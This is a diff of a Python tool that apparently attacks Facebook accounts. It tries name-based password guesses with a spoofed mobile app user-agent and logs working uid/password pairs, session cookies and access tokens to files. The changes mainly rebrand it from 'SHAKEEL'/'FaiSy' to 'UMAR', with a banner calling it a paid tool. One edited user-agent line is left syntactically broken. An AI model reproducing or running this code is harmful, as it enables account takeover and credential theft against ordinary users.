@@ -45,15 +45,33 @@ SEX = f"{random.choice(['Liger', 'METERED', 'MOBILE.EDGE', 'MOBILE.HSPA', 'MOBIL
 ses = requests.Session()
 def logo():
 	os.system('clear')
-	logo = (f'''\033[1;92m
-\33[1;32m---------------------------------------------------
-___________      .__  _________      
-\_   _____/____  |__|/   _____/__.__.
- |    __) \__  \ |  |\_____  <   |  |
- |     \   / __ \|  |/        \___  |
- \___  /  (____  /__/_______  / ____|
-     \/        \/           \/\/
-\33[1;32m--------------------------------------------------''')
+	logo= ("""\33[;33m   
+         
+\033[92m
+  ______             __                           
+ /      \           /  |                          
+/$$$$$$  | __    __ $$ |____    ______    ______  
+$$ |  $$/ /  |  /  |$$      \  /      \  /      \ 
+$$ |      $$ |  $$ |$$$$$$$  |/$$$$$$  |/$$$$$$  |
+$$ |   __ $$ |  $$ |$$ |  $$ |$$    $$ |$$ |  $$/ 
+$$ \__/  |$$ \__$$ |$$ |__$$ |$$$$$$$$/ $$ |      
+$$    $$/ $$    $$ |$$    $$/ $$       |$$ |      
+ $$$$$$/   $$$$$$$ |$$$$$$$/   $$$$$$$/ $$/       
+          /  \__$$ |                              
+          $$    $$/                               
+           $$$$$$/                      
+          
+[<>] The Original Codes are Written by Umar Nazeer 
+----------------------------------------------------------------------
+ ╰◈▪➣ Author    : 𝙐𝙈𝘼𝙍 𝙉𝘼𝙕𝙀𝙀𝙍
+ ╰◈▪➣ Facebook  : https://www.facebook.com/InnocentUmarr
+ ╰◈▪➣ Status    : PAID TOOL
+ ╰◈▪➣ Version   : 8.7.2 \033[1;37m
+      \033[1;96m★彡[ɪᴍʀᴀɴ ᴋʜᴀɴ ʟᴏᴠᴇʀ]彡★\033[1;97m
+----------------------------------------------------------------------
+OK ids will be saved in 𝙐𝙈𝘼𝙍 folder
+----------------------------------------------------------------------
+\033[1;97m""")
 	p(logo)
 def clear():
 	os.system("clear")
@@ -259,7 +277,7 @@ class iAmMain:
 	def method1(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [FaiSy] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [UMAR] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
@@ -267,7 +285,7 @@ class iAmMain:
 				ln = fn
 			for ps in pwx:
 				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
-				ua = "[FBAN/FB4A;FBAV/375.1.0.28.111;FBBV/382948769;FBDM/{density=3.0,width=1080,height=2097};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G990U;FBSV/12;FBOP/1;FBCA/arm64-v8a:armeabi;]"
+				ua = "[[FBAN/FB4A;FBAV/375.1.0.28.111;FBBV/382948769;FBDM/{density=3.0,width=1080,height=2097};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G990U;FBSV/12;FBOP/1;FBCA/arm64-v8a:armeabi;]
 				data = {"adid": str(uuid.uuid4()),
 "format": "json",
 "device_id": str(uuid.uuid4()),
@@ -335,7 +353,7 @@ class iAmMain:
 	def method2(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r FaiSy %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r UMAR %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
@@ -388,16 +406,16 @@ class iAmMain:
 					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
 					token = q["access_token"]
 					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
-					p('\r\033[1;92m[SHAKEEL-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					p(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
 					ok.append(uid)
-					open('/sdcard/SHAKEEL_M2_OK.txt','a').write(uid+'|'+pw+'\n')
-					open('/sdcard/SHAKEEL_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
+					open('/sdcard/UMAR_M2_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;91m[SHAKEEL-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
-					open('/sdcard/SHAKEEL_M2_CP.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M2_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
 				else:
 					continue
@@ -409,7 +427,7 @@ class iAmMain:
 	def method3(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [SHAKEEL %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [UMAR %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
@@ -462,15 +480,15 @@ class iAmMain:
 					token = q["access_token"]
 					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
 					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
-					p('\r\033[1;92m[SHAKEEL-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					ok.append(uid)
-					open('/sdcard/SHAKEEL_M3_OK.txt','a').write(uid+'|'+pw+'\n')
-					open('/sdcard/SHAKEEL_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
+					open('/sdcard/UMAR_M3_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;91m[SHAKEEL-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
-					open('/sdcard/SHAKEEL_M3_CP.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M3_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
 				else:
 					continue
@@ -482,7 +500,7 @@ class iAmMain:
 	def method4(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [SHAKEEL] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [UMAR] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
